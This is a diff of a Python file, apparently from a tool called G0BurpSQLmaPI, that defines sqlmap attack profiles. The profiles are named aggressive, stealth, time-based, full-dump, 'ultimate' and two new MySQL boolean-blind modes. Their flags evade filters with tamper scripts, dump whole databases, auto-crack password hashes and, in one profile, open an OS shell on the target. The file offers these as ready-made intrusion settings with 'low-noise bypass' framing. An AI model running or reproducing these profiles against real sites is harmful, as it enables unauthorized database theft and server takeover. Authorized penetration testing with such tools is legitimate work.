@@ -1,4 +1,7 @@
-# lib/payloads.py
+# ============================================================
+#  G0BurpSQLmaPI - SQLMAP PAYLOAD PROFILES
+#  Stable, real-world oriented profiles
+# ============================================================
 
 # ============================
 # SQLMAP default tamper set
@@ -6,9 +9,13 @@
 TAMPERS = "between,randomcase,space2comment"
 
 # ============================
-# SQLMAP attack profiles (menu)
+# SQLMAP attack profiles
 # ============================
 SQLMAP_PROFILES = {
+
+    # --------------------------------------------------------
+    # AGGRESSIVE
+    # --------------------------------------------------------
     "aggressive": {
         "name": "🔥 AGGRESSIVE",
         "description": "Fast scanning profile with medium noise",
@@ -18,10 +25,13 @@ SQLMAP_PROFILES = {
             "--risk=2",
             "--level=3",
             f"--tamper={TAMPERS}",
-            "--dump"
+            "--dump",
         ],
     },
 
+    # --------------------------------------------------------
+    # STEALTH
+    # --------------------------------------------------------
     "stealth": {
         "name": "🛡️ STEALTH",
         "description": "Low-noise bypass mode",
@@ -32,10 +42,13 @@ SQLMAP_PROFILES = {
             "--level=1",
             "--technique=E",
             f"--tamper={TAMPERS}",
-            "--dump"
+            "--dump",
         ],
     },
 
+    # --------------------------------------------------------
+    # TIME BASED
+    # --------------------------------------------------------
     "time_based": {
         "name": "⏱️ TIME-BASED",
         "description": "Blind SQLi timing attack",
@@ -45,10 +58,14 @@ SQLMAP_PROFILES = {
             "--risk=3",
             "--level=5",
             "--technique=T",
-            "--dump"
+            "--time-sec=10",
+            "--dump",
         ],
     },
 
+    # --------------------------------------------------------
+    # FULL DUMP
+    # --------------------------------------------------------
     "full_dump": {
         "name": "📊 FULL DUMP",
         "description": "Dump entire databases",
@@ -59,10 +76,12 @@ SQLMAP_PROFILES = {
             "--risk=3",
             "--level=5",
             f"--tamper={TAMPERS}",
-            "--dump"
         ],
     },
 
+    # --------------------------------------------------------
+    # ULTIMATE
+    # --------------------------------------------------------
     "ultimate": {
         "name": "💀 ULTIMATE",
         "description": "Maximum brute force & enumeration",
@@ -75,22 +94,65 @@ SQLMAP_PROFILES = {
             "--technique=BEUSTQ",
             "--os-shell",
             f"--tamper={TAMPERS}",
-            "--dump"
         ],
     },
 
+    # ============================
+	# BOOLEAN BLIND — SAFE (no-cast)
+	# ============================
+	"boolean_mysql_blind_nocast": {
+    "name": "🧠 BOOLEAN BLIND (NO-CAST)",
+    "description": "Blind MySQL/MariaDB, avoids CAST errors (HTTP 500 safe)",
+    "options": [
+        "--batch",
+        "--answers=crack=Y,dict=Y,continue=Y,quit=N",
+        "--technique=B",
+        "--dbms=mysql",
+        "--no-cast",
+        "--level=5",
+        "--risk=3",
+        "--time-sec=10",
+        "--threads=3",
+        "--flush-session",
+        "--current-db",
+    ],
+},
+
+	# ============================
+	# BOOLEAN BLIND — HEX (stable)
+	# ============================
+	"boolean_mysql_blind_hex": {
+    "name": "🧠 BOOLEAN BLIND (HEX)",
+    "description": "Blind MySQL/MariaDB using hex encoding (no --no-cast)",
+    "options": [
+        "--batch",
+        "--answers=crack=Y,dict=Y,continue=Y,quit=N",
+        "--technique=B",
+        "--dbms=mysql",
+        "--hex",
+        "--level=5",
+        "--risk=3",
+        "--time-sec=10",
+        "--threads=3",
+        "--flush-session",
+        "--current-db",
+    ],
+},	
+    # --------------------------------------------------------
+    # CUSTOM
+    # --------------------------------------------------------
     "custom": {
         "name": "⚙️ CUSTOM",
         "description": "User-defined SQLmap flags",
         "options": [],
     },
 
-    # ============================
-    # DEFAULT FULL — now LAST
-    # ============================
+    # --------------------------------------------------------
+    # DEFAULT FULL (legacy, LAST)
+    # --------------------------------------------------------
     "default_full": {
         "name": "⭐ DEFAULT FULL",
-        "description": "Original G0BurpSQLmaPI default heavy flags",
+        "description": "Original G0BurpSQLmaPI heavy flags",
         "options": [
             "--tamper=space2comment",
             "--dbms=mysql",
@@ -103,15 +165,21 @@ SQLMAP_PROFILES = {
             "--technique=BEUSTQ",
             "--union-char=UCHAR",
             "--answers=crack=Y,dict=Y,continue=Y,quit=N",
-            "--dump"
+            "--dump",
         ],
     },
 }
 
 
+# ============================================================
+# HELPERS
+# ============================================================
+
 def get_attack_profile(name: str):
     """Return profile options by name; fallback to aggressive."""
-    return SQLMAP_PROFILES.get(name, SQLMAP_PROFILES["aggressive"])["options"]
+    return SQLMAP_PROFILES.get(
+        name, SQLMAP_PROFILES["aggressive"]
+    )["options"]
 
 
 def get_sqlmap_default_args(MODULES_EXPLOIT_PATH, params_flag, profile="default_full"):
@@ -120,12 +188,10 @@ def get_sqlmap_default_args(MODULES_EXPLOIT_PATH, params_flag, profile="default_
     """
     args = ["-r", str(MODULES_EXPLOIT_PATH), *params_flag]
 
-    # If a valid profile exists, append it
-    profile_opts = SQLMAP_PROFILES.get(profile)
-    if profile_opts:
-        args += profile_opts["options"]
+    profile_data = SQLMAP_PROFILES.get(profile)
+    if profile_data:
+        args += profile_data["options"]
     else:
-        # Fallback to default_full
         args += SQLMAP_PROFILES["default_full"]["options"]
 
     return args
